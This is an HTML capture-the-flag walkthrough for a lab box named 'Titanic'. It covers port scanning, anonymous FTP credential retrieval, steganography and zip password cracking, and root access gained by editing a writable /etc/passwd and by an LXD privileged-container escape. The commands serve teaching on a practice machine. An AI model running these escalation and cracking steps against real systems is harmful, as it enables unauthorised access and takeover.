@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Titanic Walkthrough</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #f5f5f5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            padding: 40px;
+        }
+        h1 {
+            font-size: 40px;
+            color: #90caf9;
+        }
+        h2, h3 {
+            color: #9cc0de;
+        }
+        pre {
+            background-color: #212121;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+            color: #e0e0e0;
+        }
+    code {
+            font-size: 14px;
+            font-family: monospace;
+            color: #ffcc80;
+        }
+        img {
+            max-width: 50%;
+            margin: 10px 0;
+        }
+        a {
+            color: #80d8ff;             
+            text-decoration: none;      
+        }
+        a:hover {
+            color: #40c4ff;     
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <h1>Titanic - Walkthrough</h1>
+    <p></p>Hi! Welcome to this walkthrough on the <strong>Titanic</strong> box. In this room we explores basic enumeration, steganography, password cracking, and privilege escalation techniques.</p>
+    <h2>📚 Table of Contents</h2>
+<ul>
+    <li><a href="#recon">🔍 Reconnaissance</a></li>
+    <li><a href="#ftp">📂 FTP Enumeration</a></li>
+    <li><a href="#ssh">🔐 SSH Access</a></li>
+    <li><a href="#stego">🖼️ Steganography – titanic.jpg</a></li>
+    <li><a href="#zip">🔓 Cracking Zip File</a></li>
+    <li><a href="#users">👥 User Enumeration and Access</a></li>
+    <li><a href="#linpeas">🧨 Privilege Escalation - linPEAS</a></li>
+    <li><a href="#lxd">🚀 Privilege Escalation - LXD Container Escape</a></li>
+    <li><a href="#conclusion">🏁 Conclusion</a></li>
+</ul>
+    <h2 id="recon">🔍 Reconnaissance</h2>
+    <p>Let’s get started with some port scanning with nmap.</p>
+    <pre><code>nmap -sC -sV 192.168.0.139</code></pre>
+    <p>The -sV flag adds version detection, the -sC flag runs some default scripts</p>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/1.png">
+    <p><strong>Key Finding:</strong><br> - FTP (21): Anonymous login<br> - SSH (22): Requires credentials</p>
+    <a href="/Users/Shana Buhaisa P/Documents/Titanic/TItanicNmap.txt" download>Nmap Report</a>
+
+    <h2 id="ftp">📂 FTP Enumeration</h2>
+    <p>We can see, “Anonymous FTP log in allowed” and we can see a “cred.txt” file. We can log in through anonymous and cat the text file.<br><br>
+        In our operating system, we need to open a preferred directory for downloading files via FTP.</p>
+    <pre><code>ftp 192.168.0.139
+ls
+get cred.txt
+exit</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/2.png">
+    <p>Check file content:</p>
+    <pre><code>cat cred.txt</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/3.png">
+    <p><strong>Hint:</strong> "My name rhymes with 'back' and starts with a 'j'" ⇒ <strong>Username: jack</strong></p>
+    <p>Password is Base64 encoded:</p>
+    <pre><code>echo UXVlZW5zdG93bkAxOTk3 | base64 -d</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/4.png">
+    <p><strong>Credentials:</strong> Username: jack, Password: Queenstown@1997</p>
+
+    <h2 id="ssh">🔐 SSH Access</h2>
+    <pre><code>ssh jack@192.168.0.139</code></pre>
+    <p>We got the acces! Let’s check if there is any files.</p>
+    <pre><code>ls
+cat flag1.txt</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/5.png">
+
+    <h2 id="stego">🖼️ Steganography – titanic.jpg</h2>
+    <p>There is also an image named “titanic.jpg” in it. We have to move this image to our operating system to open it.</p>
+    <pre><code>scp jack@192.168.0.139:/home/jack/titanic.jpg /home/kali</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/6.png">
+    <p>Let’s use steghide on the image for checking if there is any hidden files in it. So for the passphrase, we need to osint to the Titanic movie.<br>Let’s create a wordlist using cewl: 
+    </p>
+    <pre><code>cewl "https://en.wikipedia.org/wiki/Titanic_(1997_film)" -w titaniclist</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/7.png">
+    <p>By using stegcracker , we can crack the passphrase.</p>
+    <pre><code>stegcracker titanic.jpg titaniclist</code></pre>
+    <p>Extract:</p>
+    <pre><code>steghide extract -sf titanic.jpg</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/8.png">
+
+    <h2 id="zip">🔓 Cracking Zip File</h2>
+    <p>The zip file “Dawson.zip” is also password protected. To find the password, we can use fcrackzip.</p>
+    <pre><code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt Dawson.zip</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/9.png">
+    <p>By using the password <b>ilovejack</b>, we can unzip the file and check if there is any files in it.</p>
+    <pre><code>unzip Dawson.zip
+cat Dewitt.txt</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/10.png">
+    <p>Looks like <b>NeverLetGo</b> is a password. Let’s take a look if there is any existing users other than jack.</p>
+    <h2 id="users">👥 User Enumeration and Access</h2>
+    <pre><code>cd /home
+ls
+su rose</code></pre>
+    <pre><code>ls
+cat flag2.txt</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/11.png">
+    <p>The rhyme shows that there is root and now we want to escalate our privilege.</p>
+
+    <h2 id="linpeas">🧨 Privilege Escalation - linPEAS</h2>
+    <p>Let’s run linpeas to exploit vulnerabilities. For that, let’s copy linpeas into rose.</p>
+    <pre><code>linpea
+scp linpeas.sh rose@192.168.0.139:/home/rose</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/12.png">
+    <pre><code>./linpeas.sh</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/13.png">
+    <p>Looks like /etc/passwd and /etc/shadow are writable files. Let’s cat /etc.passwd and try to edit the uid of rose into “0’.</p>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/14.png">
+    <p>Modify passwd:</p>
+    <pre><code>nano /etc/passwd</code></pre>
+    <p>Change UID to 0, then:</p>
+    <pre><code>su rose
+cd /root
+cat flag3.txt</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/15.png">
+
+    <h2 id="lxd">🚀 Privilege Escalation - LXD Container Escape</h2>
+    <p>Let’s download the build alpine using the GitHub repose.</p>
+    <pre><code>git clone https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/16.png">
+    <p>Let’s copy the “alpine-v3.13-x86_64-20210218_0139.tar.gz” to jack.</p>
+    <pre><code>scp alpine-v3.13-*.tar.gz jack@192.168.0.139:/home/jack</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/17.png">
+    <pre><code>
+lxc image import alpine-v3.13-*.tar.gz --alias alpine
+lxc init alpine ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/18.png">
+    <pre><code>lxc exec ignite /bin/sh</code></pre>
+    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/19.png">
+    <pre><code>cd /mnt/root/root
+ls
+cat flag3.txt</code></pre>
+    <h2 id="conclusion">🏁 Conclusion</h2>
+    <p>The Titanic box provided hands-on experience with various techniques: enumeration, steganography, password cracking, and privilege escalation via system misconfigurations and LXD escape. A must-try for Cybersecurity learners!</p>
+
+</body>
+</html>
